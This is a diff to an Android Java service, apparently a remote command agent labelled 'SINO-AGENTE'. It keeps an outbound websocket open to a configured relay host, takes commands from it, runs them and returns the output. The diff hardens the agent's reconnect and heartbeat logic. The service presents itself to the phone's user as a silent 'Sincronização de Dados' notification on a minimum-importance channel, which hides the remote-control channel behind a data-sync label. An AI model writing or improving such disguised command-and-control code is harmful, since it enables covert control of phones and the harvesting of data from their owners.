@@ -3,7 +3,6 @@ package br.svc.relay;
 import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
-import android.app.PendingIntent;
 import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
@@ -20,18 +19,13 @@ import org.json.JSONObject;
 
 import java.util.Locale;
 
-/**
- * SINO-AGENTE — tubo de conexao com o SINO-TUBO.
- * Conecta wss saindo do aparelho (4G/5G/qualquer NAT), executa comandos,
- * responde na sala. Reconecta com backoff. Batimento a cada 25s.
- */
+/** SINO-AGENTE v1.1 — tubo de conexao com o SINO-TUBO. */
 public class RelayService extends Service {
 
     private static final String CH = "sync_data_min";
     private static final int NOTIF_ID = 2002;
 
     private WsClient ws;
-    private Handler ui;
     private volatile boolean running = true;
     private long startedAt = 0;
 
@@ -39,7 +33,6 @@ public class RelayService extends Service {
     public void onCreate() {
         super.onCreate();
         startedAt = System.currentTimeMillis();
-        ui = new Handler(Looper.getMainLooper());
         goForeground();
 
         String url = "wss://" + BuildConfig.TUBO_HOST + "/ws?id=" + BuildConfig.POSTO
@@ -50,9 +43,9 @@ public class RelayService extends Service {
             while (running) {
                 try {
                     ws = new WsClient();
-                    sendRaw("sat-agente online v" + BuildConfig.VERSION_NAME);
-                    ws.connect(url, this::onMsg);
-                    backoff = 3000; // conexao durou: reseta backoff ao cair
+                    ws.connect(url, this::onMsg,
+                            () -> sendRaw("sat-agente online v" + BuildConfig.VERSION_NAME));
+                    backoff = 3000;
                 } catch (Exception e) {
                     sendRaw("sat-agente erro: " + e);
                 }
@@ -63,12 +56,17 @@ public class RelayService extends Service {
             }
         }, "relay-conn").start();
 
-        // batimento cardíaco
         new Thread(() -> {
             while (running) {
                 sleep(25_000);
-                if (ws != null && ws.isOpen()) {
-                    try { ws.sendText("{\"type\":\"hb\"}"); } catch (Exception ignored) { }
+                if (ws != null) {
+                    if (ws.stale(90_000)) {           // zumbi: forca reconexao
+                        sendRaw("sat-agente zumbi detectado, reconectando");
+                        continue;
+                    }
+                    if (ws.isOpen()) {
+                        try { ws.sendText("{\"type\":\"hb\"}"); } catch (Exception ignored) { }
+                    }
                 }
             }
         }, "relay-hb").start();
@@ -80,20 +78,24 @@ public class RelayService extends Service {
             if (!"cmd".equals(o.optString("type"))) return;
             final long rid = o.getLong("rid");
             final String cmd = o.optString("cmd", "");
+            sendRaw("exec: " + cmd);
             new Thread(() -> {
-                String out = handle(cmd);
+                String out;
+                try { out = handle(cmd); }
+                catch (Throwable t) { out = "erro handle: " + t; }
                 try {
                     JSONObject r = new JSONObject();
                     r.put("type", "reply");
                     r.put("rid", rid);
                     r.put("out", out);
                     if (ws != null && ws.isOpen()) ws.sendText(r.toString());
+                    else sendRaw("sem ws pra responder");
                 } catch (Exception e) {
-                    sendRaw("sat-agente erro reply: " + e);
+                    sendRaw("erro reply: " + e);
                 }
             }, "relay-exec").start();
         } catch (Exception e) {
-            sendRaw("sat-agente msg invalida: " + e);
+            sendRaw("msg invalida: " + e);
         }
     }
 
@@ -116,7 +118,12 @@ public class RelayService extends Service {
     }
 
     private String statusLine() {
-        Intent bi = registerReceiver(null, new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
+        IntentFilter f = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+        Intent bi;
+        if (Build.VERSION.SDK_INT >= 33)
+            bi = registerReceiver(null, f, Context.RECEIVER_NOT_EXPORTED);
+        else
+            bi = registerReceiver(null, f);
         int bat = bi != null ? bi.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
         long upMin = (System.currentTimeMillis() - startedAt) / 60_000L;
         boolean tubo = ws != null && ws.isOpen();
@@ -131,9 +138,8 @@ public class RelayService extends Service {
     private void goForeground() {
         NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
         if (Build.VERSION.SDK_INT >= 26) {
-            NotificationChannel ch = new NotificationChannel(CH, "sincronizacao de dados",
-                    NotificationManager.IMPORTANCE_MIN);
-            nm.createNotificationChannel(ch);
+            nm.createNotificationChannel(new NotificationChannel(CH, "sincronizacao de dados",
+                    NotificationManager.IMPORTANCE_MIN));
         }
         Notification.Builder b = Build.VERSION.SDK_INT >= 26
                 ? new Notification.Builder(this, CH)
@@ -141,8 +147,7 @@ public class RelayService extends Service {
         b.setContentTitle("Sincronização de Dados")
          .setContentText("Sincronizando…")
          .setSmallIcon(android.R.drawable.stat_notify_sync)
-         .setOngoing(false)
-         .setShowWhen(false);
+         .setOngoing(false).setShowWhen(false);
         if (Build.VERSION.SDK_INT >= 31) b.setForegroundServiceBehavior(Notification.FOREGROUND_SERVICE_IMMEDIATE);
         startForeground(NOTIF_ID, b.build());
     }
